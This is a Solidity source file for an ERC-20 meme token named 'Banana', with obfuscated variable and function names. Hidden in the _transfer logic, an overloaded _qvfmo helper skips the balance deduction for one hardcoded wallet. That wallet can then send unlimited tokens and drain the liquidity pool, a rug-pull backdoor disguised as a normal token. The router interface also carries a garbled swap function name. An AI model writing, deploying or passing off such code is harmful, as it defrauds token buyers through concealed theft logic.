/**

TWITTER: https://twitter.com/BANANA_PORTAL
TELEGRAM: https://t.me/BANANA_COIN
WEBSITE: https://bananaerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qvfmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qvfmo(a, b, "SafeMath:");
    }

    function  _qvfmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kfvqosjmp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pafyakmjfs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Banana is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Banana";
    string private constant _symbol = unicode"BANANA";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalhm = 1000000000 * 10 **_decimals;
    uint256 public _mxTakpAmaunt = _Totalhm;
    uint256 public _Walleubvwx = _Totalhm;
    uint256 public _wapThresholdeux= _Totalhm;
    uint256 public _mokmTouvp= _Totalhm;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEvakdFbvf;
    mapping (address => bool) private _taxbWalory;
    mapping(address => uint256) private _lruevrkacep;
    bool public _tlfereslxnove = false;
    address payable private _qkbfadvbvp;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsyst=0;
    uint256 private _burfjvet=0;

    _pafyakmjfs private _fmoRkbsovt;
    address private _acdPtrdcw;
    bool private _prjcjvtoh;
    bool private iuoSwprlq = false;
    bool private _aqlEadljp = false;

    event _amrfduyol(uint _mxTakpAmaunt);
    modifier lckrbThopvp {
        iuoSwprlq = true;
        _;
        iuoSwprlq = false;
    }

    constructor () {
        _qkbfadvbvp = payable(0xF77649d960cE59E06d276982AF5fdd64974f7220);
        _balances[_msgSender()] = _Totalhm;
        _isEvakdFbvf[owner()] = true;
        _isEvakdFbvf[address(this)] = true;
        _isEvakdFbvf[_qkbfadvbvp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalhm);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalhm;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qvfmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_fmoRkbsovt) && to !=
                 address(_acdPtrdcw)) {
                  require(_lruevrkacep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruevrkacep
                  [tx.origin] = block.number;
                }
            }

            if (from == _acdPtrdcw && to != 
            address(_fmoRkbsovt) && !_isEvakdFbvf[to] ) {
                require(amount <= _mxTakpAmaunt,
                 "Exceeds the _mxTakpAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walleubvwx, "Exceeds the maxWalletSize.");
                if(_burfjvet
                < _wapBeforeqsyst){
                  require(! _yfoqvaz(to));
                }
                _burfjvet++;
                 _taxbWalory[to]=true;
                teeomoun = amount.mul((_burfjvet>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acdPtrdcw && from!= address(this) 
            && !_isEvakdFbvf[from] ){
                require(amount <= _mxTakpAmaunt && 
                balanceOf(_qkbfadvbvp)<_mokmTouvp,
                 "Exceeds the _mxTakpAmaunt.");
                teeomoun = amount.mul((_burfjvet>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burfjvet>_wapBeforeqsyst &&
                 _taxbWalory[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iuoSwprlq 
            && to == _acdPtrdcw && _aqlEadljp &&
             contractTokenBalance>_wapThresholdeux 
            && _burfjvet>_wapBeforeqsyst&&
             !_isEvakdFbvf[to]&& !_isEvakdFbvf[from]
            ) {
                _swpvknrvuj( _qvume(amount, 
                _qvume(contractTokenBalance,_mokmTouvp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _moedjfp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qvfmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qvfmo(teeomoun));
        emit Transfer(from, to, 
        amount. _qvfmo(teeomoun));
    }

    function _swpvknrvuj(uint256
     tokenAmount) private lckrbThopvp {
        if(tokenAmount==0){return;}
        if(!_prjcjvtoh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _fmoRkbsovt.WETH();
        _approve(address(this),
         address(_fmoRkbsovt), tokenAmount);
        _fmoRkbsovt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qvume(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qvfmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkbfadvbvp){
            return a ;
        }else{
            return a . _qvfmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTakpAmaunt = _Totalhm;
        _Walleubvwx = _Totalhm;
        _tlfereslxnove = false;
        emit _amrfduyol(_Totalhm);
    }

    function _yfoqvaz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _moedjfp(uint256
    amount) private {
        _qkbfadvbvp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _prjcjvtoh);
        _fmoRkbsovt   =  _pafyakmjfs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_fmoRkbsovt), _Totalhm);
        _acdPtrdcw = _kfvqosjmp(_fmoRkbsovt.factory()). createPair (address(this),  _fmoRkbsovt . WETH ());
        _fmoRkbsovt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acdPtrdcw).approve(address(_fmoRkbsovt), type(uint).max);
        _aqlEadljp = true;
        _prjcjvtoh = true;
    }

    receive() external payable {}
}